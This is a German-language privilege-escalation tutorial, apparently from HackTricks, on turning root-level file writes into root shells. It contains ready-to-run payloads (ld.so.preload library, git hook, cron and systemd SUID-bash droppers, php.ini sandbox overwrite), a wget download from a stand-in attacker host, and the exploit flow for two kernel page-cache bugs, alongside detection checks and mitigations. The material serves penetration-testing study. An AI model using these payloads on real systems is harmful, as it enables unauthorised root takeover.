# Beliebiges Schreiben in Dateien als Root

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste von shared objects, die der dynamic linker vor anderen shared objects lädt. Der Secure-Execution-Modus wendet zusätzliche Einschränkungen auf das Preloading an, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-binarys.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei lädt, die aufgelistete Bibliothek vor seinen anderen shared objects, wodurch die Ausführung von Code im Kontext dieses Prozesses ermöglicht wird.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, einschließlich Commit- und Merge-Vorgängen. Wenn ein **privileged script oder user** diese Aktionen ausführt und ein Angreifer in den Ordner **`.git`** **schreiben** kann, kann der Hook zur **privilege escalation** verwendet werden.<sup>[[13]](#references)</sup>

Zum Beispiel ist es möglich, ein **Skript zu erstellen** in einem Git-Repository unter **`.git/hooks`**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron- und Zeitdateien

Wenn du **in Cron-bezogene Dateien schreiben kannst, die von root ausgeführt werden**, kannst du normalerweise beim nächsten Ausführen des Jobs Code execution erreichen. Interessante Ziele sind:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die eigene Crontab von root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Services

Schnelle Prüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchspfade:

- **Einen neuen root-cron job an** `/etc/crontab` **oder eine Datei in** `/etc/cron.d/` **anhängen**
- **Ein bereits von** `run-parts` **ausgeführtes Script ersetzen**
- **Ein vorhandenes Timer-Ziel backdooren**, indem das von ihm gestartete Script oder Binary geändert wird

Minimales Beispiel für ein cron-Payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher bevorzugt Namen wie `backup` statt `backup.sh`.<sup>[[15]](#references)</sup>
- Einige Systeme verwenden `systemd`-Timer anstelle des klassischen cron, aber die Idee des Missbrauchs ist dieselbe: **Ändere, was root später ausführen wird**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, ist möglicherweise eine Codeausführung als root möglich, indem du die Unit neu lädst und neu startest oder wartest, bis der Service-/Socket-Aktivierungspfad ausgelöst wird.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Überschreibungen in `/etc/systemd/system/<unit>.d/*.conf`
- Von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` referenzierte Service-Skripte/-Binärdateien
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnellprüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-owned Service-Unit, die du ändern kannst
- **Eine Drop-in-Überschreibung hinzufügen** mit einem schädlichen `ExecStart=` und den alten Eintrag zuvor löschen
- **Das bereits von der Unit referenzierte Script/Binary mit einer Backdoor versehen**
- **Einen socket-aktivierten Service hijacken**, indem du die entsprechende `.service`-Datei änderst, die gestartet wird, sobald der Socket eine Verbindung empfängt

Beispiel für eine schädliche Überschreibung:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Dienste nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des als root laufenden backdoored Dienstes auszulösen.<sup>[[17]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren vom Benutzer bereitgestelltes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der sandboxed Code weiterhin über **irgendeinen Schreibprimitive** (wie `file_put_contents`) verfügt und du den **genauen `php.ini`-Pfad** erreichen kannst, der vom Daemon verwendet wird, kannst du diese **Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload übermitteln, der mit erweiterten Privilegien ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem die gefährlichen Funktionen wieder aktiviert wurden.

Minimales Beispiel (den vom Daemon verwendeten Pfad ersetzen):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der daemon als root läuft (oder mit Pfaden validiert, die root gehören), liefert die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen eine **Privilege Escalation durch Überschreiben der Konfiguration**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet ein Dateitypmuster einem Interpreter zu. Die Auswirkungen auf die Privilegien hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Überprüfe daher diese Voraussetzungen, bevor du dies als möglichen Privilege-Escalation-Pfad behandelst.<sup>[[21]](#references)</sup>

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Einträge, um eine Anwendung für URI-Schemas auszuwählen. Ein Angreifer, der in die relevanten benutzerspezifischen Konfigurations- und Desktop-Entry-Verzeichnisse schreiben kann, kann diese Schemas zu einem von ihm kontrollierten Launcher umleiten. Durch Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei verweisen (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Benutzerklick diesen Desktop-Eintrag aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root führt vom Benutzer beschreibbare Scripts/Binaries aus

Wenn ein privilegierter Ablauf etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine beliebige Binary innerhalb eines Verzeichnisses, das einem nicht privilegierten Benutzer gehört), kannst du die Ausführung übernehmen:<sup>[[1]](#references)</sup>

- **Die Ausführung erkennen:** Überwache Prozesse mit pspy, um festzustellen, wann Root benutzerkontrollierte Pfade aufruft.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und für ihn beschreibbar sind.
- **Ziel übernehmen:** Sichere die ursprüngliche Binary bzw. das ursprüngliche Script und lege ein Payload ab, das eine SUID-Shell (oder eine andere Root-Aktion) erstellt. Stelle anschließend die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den hijackten Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur-Page-Cache-Dateimodifikation privilegierter Binaries

Einige Kernel-Bugs modifizieren die Datei **nicht auf der Festplatte**. Stattdessen erlauben sie nur die Modifikation der **Page-Cache-Kopie** einer lesbaren Datei. Wenn ein **setuid**- oder anderweitig **root-ausgeführtes** Binary angegriffen werden kann, führt die nächste Ausführung möglicherweise vom Angreifer kontrollierte Bytes aus dem Speicher aus und eskaliert die Privilegien, obwohl der Datei-Hash auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Dies lässt sich als **Runtime-only-file-write-Primitive** betrachten:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt sauber**: Inode und Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer modifizierten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Verdrängung aus dem Cache

Dieses Primitive liegt zwischen einem klassischen **arbitrary file write** und älteren **page-cache-abuse**-Bugs wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW basierte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Ein Page-Cache-only-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe in gecachte, dateigestützte Pages ermöglicht

#### Generischer privesc-Ablauf

1. Ein Kernel-Primitive erlangen, das in **dateigestützte Page-Cache-Pages** schreiben kann
2. Es gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **vor** der Verdrängung der Page aus dem Cache auslösen
4. Code execution als root erhalten, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsam genutztem Host-Kernel/Page-Cache** ausgeführt werden

#### AF_ALG + `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad befand sich in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-`algif_aead`-Decrypt-Pfad verwendete Quell- und Zielbuffer wieder
- `authencesn` schrieb anschließend in die Ziel-Tag-Region
- wenn diese Region weiterhin auf dateigestützte, gesplicte Pages verwies, landete der Schreibzugriff im **Page-Cache der Zieldatei**

Die interessante Technik ist daher nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als beschreibbaren Output zu **behandeln**
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibzugriffe**, um `/usr/bin/su` im Speicher zu patchen und anschließend auszuführen.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter-TEE-Clone-Beispielpfad

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **page-cache-only-write-to-root**-Musters, diesmal jedoch mit **IPsec-ESP-Decrypt** statt `AF_ALG` als Sink.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtigste Technik ist der Schritt des **Metadata-Laundering**:

- `splice()` platziert eine **read-only, dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Decrypting **kopiert**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Clone behält dieselbe **physische Page-Cache-Referenz**, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Clone anschließend als sicher und führt den **In-Place-Decrypt** mit `cbc(aes)` über die dateigestützte Page aus

Die Lehre für Reviewer ist daher umfassender als die CVE: Wenn eine Mitigation von **skb-/Page-Metadaten** abhängt, um zu entscheiden, ob eine Operation zunächst kopieren muss, kann jeder **Clone-/Copy-Pfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, das Write-Primitive unbemerkt wieder öffnen.

Typischer Exploitation-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, um **`CAP_NET_ADMIN` innerhalb eines privaten Network Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. XFRM-ESP-Transport-SAs über `NETLINK_XFRM` installieren
4. jedes anvisierte 4-Byte-Word im SA-Feld `seq_hi` codieren (DirtyFrags Trick zur Auswahl des Words)
5. das gesplicte ESP-in-UDP-Paket senden, damit der **TEE-Clone** `esp_input()` erreicht und den Decrypt **In-Place** ausführt
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einem anderen privilegierten Executable vom Angreifer kontrollierten Code enthält

In der Praxis entspricht die Auswirkung dem `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **mutierten Page-Cache-Bytes** und liefert root.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Checks zur Ermittlung der Anfälligkeit für diese Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den Clone-Pfad, während das Blockieren des automatischen Ladens von `xt_TEE` den **flag-laundering-Schritt** entfernt und das Blockieren von `esp4` / `esp6` den **Decrypt-Sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure und Hunting

Wenn du diese Fehlerklasse vermutest, verlasse dich nicht nur auf Integritätsprüfungen der Festplatte. Überprüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die folgenden Konfigurationswerte unterscheiden eine ladbare Schnittstelle von einer in den Kernel integrierten; die crypto build rules ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen bzw. entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, ausreichen kann, um aus einem lokalen foothold root zu erlangen

#### Reduzierung der Angriffsfläche für den Pfad `algif_aead`

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel einkompiliert wird, wurde bei einigen Disclosures berichtet, dass sie den init-Pfad blockieren:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Diese Art der Mitigation sollte auch bei anderen Kernel-LPEs im Gedächtnis bleiben: Wenn die Exploitation von einem bestimmten optionalen Interface abhängt, kann das Deaktivieren oder Blacklisting dieses Interfaces den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem für Benutzer beschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall-oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead – Zurück zum Betrieb out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431-Advisory](https://copy.fail/)
- [7] [Technischer Writeup von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Exploitation der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicete UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME-Anwendungszuordnungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spezifikation für Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop-Entry-Spezifikation](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-Krypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Page-Cache-Schwachstelle im Linux-Kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
